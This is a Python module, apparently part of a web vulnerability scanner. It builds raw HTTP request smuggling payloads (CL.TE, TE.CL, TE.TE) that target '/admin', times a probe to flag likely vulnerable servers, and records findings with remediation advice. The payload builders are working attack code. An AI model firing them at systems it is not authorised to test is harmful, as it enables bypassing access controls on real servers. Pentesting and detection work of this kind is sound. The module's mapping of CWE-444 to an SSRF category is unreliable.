"""HTTP Request Smuggling helpers.

Three families of payloads:

* CL.TE — front-end uses ``Content-Length``, back-end uses
  ``Transfer-Encoding: chunked``.
* TE.CL — front-end uses ``Transfer-Encoding``, back-end uses
  ``Content-Length``.
* TE.TE — both honour TE but one is fooled by an obfuscated header
  (`Transfer-Encoding: chunked\\r\\n Transfer-Encoding : x`).

The crafted output is *raw HTTP/1.1 bytes*: CRLF terminated, with a
proper request line. The companion blueprint sends them through the raw
engine, never through httpx (which would normalise them).

Detection helpers compute a baseline "GET /" timing through the user's
chosen engine and compare with a CL.TE pause payload — a slow second
request strongly suggests the back end is waiting for an extra byte.
"""
from __future__ import annotations

import time
from collections.abc import Callable
from dataclasses import dataclass, field
from urllib.parse import urlparse

from .engines import Request, Response


@dataclass
class SmugglePayload:
    name: str
    description: str
    bytes_: bytes
    notes: list[str] = field(default_factory=list)


@dataclass
class SmugglingTest:
    technique: str           # "cl.te" | "te.cl" | "te.te"
    baseline_ms: int
    probe_ms: int
    delta_ms: int
    likely_vulnerable: bool
    reason: str


def _host_and_path(url: str) -> tuple[str, str]:
    p = urlparse(url)
    host = p.netloc
    path = p.path or "/"
    if p.query:
        path = f"{path}?{p.query}"
    return host, path


def cl_te_payload(url: str, *, smuggled_method: str = "GET",
                   smuggled_path: str = "/admin") -> SmugglePayload:
    """Classic CL.TE: the front-end honours CL=6, sees one request; the
    back-end honours TE=chunked, sees the next chunk as a new request."""
    host, path = _host_and_path(url)
    body = (
        "0\r\n"
        "\r\n"
        f"{smuggled_method} {smuggled_path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 10\r\n"
        "\r\n"
        "x="
    )
    head = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
    )
    return SmugglePayload(
        name="CL.TE", description="front-end uses CL, back-end uses TE",
        bytes_=(head + body).encode(),
        notes=["front-end will forward the entire body as one request",
                "back-end will see the chunked terminator and parse the rest "
                "as a second request"],
    )


def te_cl_payload(url: str, *, smuggled_method: str = "GET",
                    smuggled_path: str = "/admin") -> SmugglePayload:
    """TE.CL: front-end honours TE=chunked; back-end honours CL=4."""
    host, path = _host_and_path(url)
    smuggled = (
        f"\r\n{smuggled_method} {smuggled_path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 10\r\n"
        "\r\n"
        "x="
    )
    chunked = (
        f"{len(smuggled):x}\r\n"
        f"{smuggled}\r\n"
        "0\r\n"
        "\r\n"
    )
    head = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
    )
    return SmugglePayload(
        name="TE.CL", description="front-end uses TE, back-end uses CL",
        bytes_=(head + chunked).encode(),
        notes=["back-end stops reading at CL=4 — bytes after are smuggled",
                "if the back-end normalises CL to TE you'll see no effect"],
    )


def te_te_payload(url: str, *, smuggled_method: str = "GET",
                    smuggled_path: str = "/admin") -> SmugglePayload:
    """TE.TE: obfuscated second TE header tricks one peer into ignoring it."""
    host, path = _host_and_path(url)
    body = (
        "0\r\n"
        "\r\n"
        f"{smuggled_method} {smuggled_path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 10\r\n"
        "\r\n"
        "x="
    )
    head = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Transfer-encoding : x\r\n"     # whitespace before colon obfuscates
        "Connection: keep-alive\r\n"
        "\r\n"
    )
    return SmugglePayload(
        name="TE.TE", description="both honour TE; one is fooled by header obfuscation",
        bytes_=(head + body).encode(),
        notes=["try variants: tab, space-before-colon, mixed case, doubled key"],
    )


PAYLOAD_BUILDERS: dict[str, Callable[[str], SmugglePayload]] = {
    "cl.te": cl_te_payload,
    "te.cl": te_cl_payload,
    "te.te": te_te_payload,
}


def detect(url: str, technique: str, *, sender: Callable[[Request], Response],
            pause_ms_threshold: int = 1500) -> SmugglingTest:
    """Timing-based heuristic: baseline GET / vs CL.TE probe with a pause.

    Returns a SmugglingTest with the deltas. A real-world confirmation
    still requires a second request and a careful read of the response.
    """
    builder = PAYLOAD_BUILDERS.get(technique.lower())
    if not builder:
        return SmugglingTest(technique, 0, 0, 0, False, "unknown technique")

    baseline = Request(method="GET", url=url)
    t0 = time.perf_counter()
    sender(baseline)
    baseline_ms = int((time.perf_counter() - t0) * 1000)

    payload = builder(url)
    probe = Request(method="POST", url=url,
                     headers=[("Content-Type", "application/octet-stream")],
                     body=payload.bytes_)
    t0 = time.perf_counter()
    sender(probe)
    probe_ms = int((time.perf_counter() - t0) * 1000)

    delta = probe_ms - baseline_ms
    vuln = delta >= pause_ms_threshold
    reason = (
        f"probe took {probe_ms} ms vs baseline {baseline_ms} ms "
        f"(delta {delta} ms; threshold {pause_ms_threshold} ms)"
    )
    return SmugglingTest(technique=technique.lower(),
                          baseline_ms=baseline_ms, probe_ms=probe_ms,
                          delta_ms=delta, likely_vulnerable=vuln,
                          reason=reason)


def record_smuggling_test(project, test: SmugglingTest, *,
                           url: str, host: str = "") -> int | None:
    """Promote a :class:`SmugglingTest` into a Finding when the probe
    indicated likely vulnerability. Negative results record a skipped
    rule_run for visibility."""
    from .findings_bus import record_finding, record_no_finding
    rule_id = f"smuggling:{test.technique}"
    if not test.likely_vulnerable:
        record_no_finding(project, rule_id=rule_id, host=host, url=url,
                            reason=test.reason)
        return None
    return record_finding(
        project, source="smuggling", rule_id=rule_id, severity="critical",
        title=f"Likely HTTP request smuggling ({test.technique.upper()})",
        description=(
            "A timing-based probe took significantly longer than the "
            "baseline, which strongly suggests the upstream front-end and "
            "back-end disagree on request framing — the classic indicator "
            "of HTTP request smuggling. Confirm manually before disclosure."
        ),
        remediation=(
            "Normalise request framing at the front-end (reject ambiguous "
            "Transfer-Encoding/Content-Length combinations, prefer HTTP/2 "
            "end-to-end) and patch the affected proxy/server software."
        ),
        cwe="CWE-444", owasp="A10:2021-Server-Side Request Forgery",
        host=host, url=url, evidence=test.reason,
    )
